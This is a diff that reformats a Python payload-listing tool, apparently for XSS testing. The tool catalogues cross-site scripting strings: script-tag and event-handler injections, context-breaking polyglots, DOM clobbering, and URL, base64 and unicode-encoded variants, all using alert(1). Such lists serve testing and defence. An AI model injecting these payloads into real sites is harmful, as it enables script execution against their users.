@@ -43,7 +43,8 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
     basic.payloads = [
         Payload("alert-script", '<script>alert("XSS")</script>', "Classic script tag injection"),
         Payload(
-            "alert-number", "<script>alert(1)</script>",
+            "alert-number",
+            "<script>alert(1)</script>",
             "Numeric alert (avoids string filters)",
         ),
         Payload(
@@ -94,13 +95,12 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
         ),
         Payload(
             "svg-animate",
-            '<svg><animate onbegin=alert(1) attributeName=x>',
+            "<svg><animate onbegin=alert(1) attributeName=x>",
             "SVG animate element",
         ),
         Payload(
             "math-tag",
-            '<math><mtext><table><mglyph><style><!--</style>'
-            '<img src=x onerror=alert(1)>',
+            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
             "Math/table context switching",
         ),
     ]
@@ -109,14 +109,14 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
     # Event handlers
     events = PayloadCategory("event-handlers", "XSS via HTML event handler attributes")
     events.payloads = [
-        Payload("onclick", '<div onclick=alert(1)>Click me</div>', "Click event"),
-        Payload("onmouseover", '<div onmouseover=alert(1)>Hover me</div>', "Mouse hover event"),
-        Payload("onerror-img", '<img src=x onerror=alert(1)>', "Image load error"),
+        Payload("onclick", "<div onclick=alert(1)>Click me</div>", "Click event"),
+        Payload("onmouseover", "<div onmouseover=alert(1)>Hover me</div>", "Mouse hover event"),
+        Payload("onerror-img", "<img src=x onerror=alert(1)>", "Image load error"),
         Payload("onload-svg", "<svg/onload=alert(1)>", "SVG load event (compact)"),
-        Payload("onfocus-input", '<input onfocus=alert(1) autofocus>', "Auto-focus input"),
+        Payload("onfocus-input", "<input onfocus=alert(1) autofocus>", "Auto-focus input"),
         Payload(
             "onblur-input",
-            '<input onblur=alert(1) autofocus><input autofocus>',
+            "<input onblur=alert(1) autofocus><input autofocus>",
             "Blur via double focus",
         ),
         Payload(
@@ -126,14 +126,13 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
         ),
         Payload(
             "onanimationend",
-            '<style>@keyframes x{}</style>'
-            '<div style="animation-name:x" onanimationend=alert(1)>',
+            '<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)>',
             "CSS animation end event",
         ),
-        Payload("onresize", '<body onresize=alert(1)>', "Window resize (requires interaction)"),
+        Payload("onresize", "<body onresize=alert(1)>", "Window resize (requires interaction)"),
         Payload(
             "onscroll",
-            '<div onscroll=alert(1)><br><br>...<br><input autofocus>',
+            "<div onscroll=alert(1)><br><br>...<br><input autofocus>",
             "Scroll event",
         ),
     ]
@@ -159,7 +158,7 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
         Payload("url-fragment", "javascript:alert(1)", "Via URL fragment if used in href"),
         Payload(
             "dom-clobbering",
-            '<form id=x><input name=y value=alert(1)>',
+            "<form id=x><input name=y value=alert(1)>",
             "DOM clobbering attack",
         ),
     ]
@@ -179,18 +178,22 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
             "/</sVg/</xSs/><sVg/oNloAd=alert()//>",
             "Wide-coverage polyglot",
         ),
-        Payload("compact-polyglot",
-                "'\"><img src=x onerror=alert(1)>",
-                "Breaks out of attribute and tag contexts"),
-        Payload("script-polyglot",
-                "</script><script>alert(1)</script>",
-                "Closes existing script, opens new one"),
-        Payload("style-polyglot",
-                "</style><script>alert(1)</script>",
-                "Breaks out of style context"),
-        Payload("comment-polyglot",
-                "--><script>alert(1)</script><!--",
-                "Breaks out of HTML comment"),
+        Payload(
+            "compact-polyglot",
+            "'\"><img src=x onerror=alert(1)>",
+            "Breaks out of attribute and tag contexts",
+        ),
+        Payload(
+            "script-polyglot",
+            "</script><script>alert(1)</script>",
+            "Closes existing script, opens new one",
+        ),
+        Payload(
+            "style-polyglot", "</style><script>alert(1)</script>", "Breaks out of style context"
+        ),
+        Payload(
+            "comment-polyglot", "--><script>alert(1)</script><!--", "Breaks out of HTML comment"
+        ),
     ]
     categories["polyglot"] = polyglot
 
@@ -210,8 +213,7 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
         Payload("url-encoded", "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "URL encoded"),
         Payload(
             "base64-data-uri",
-            '<a href="data:text/html;base64,'
-            'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
+            '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
             "Base64 in data URI",
         ),
         Payload(
@@ -219,7 +221,7 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
             '<a href="javascript:alert(1)">click</a>',
             "JavaScript protocol in href",
         ),
-        Payload("unicode-full", "\u003Cscript\u003Ealert(1)\u003C/script\u003E", "Unicode escaped"),
+        Payload("unicode-full", "\u003cscript\u003ealert(1)\u003c/script\u003e", "Unicode escaped"),
     ]
     categories["encoded"] = encoded
 
@@ -273,12 +275,14 @@ def main() -> None:
         help="Payload category to display",
     )
     parser.add_argument(
-        "--all", "-a",
+        "--all",
+        "-a",
         action="store_true",
         help="Show all payload categories",
     )
     parser.add_argument(
-        "--output", "-o",
+        "--output",
+        "-o",
         help="Save payloads to a file (one per line, raw payloads only)",
     )
 
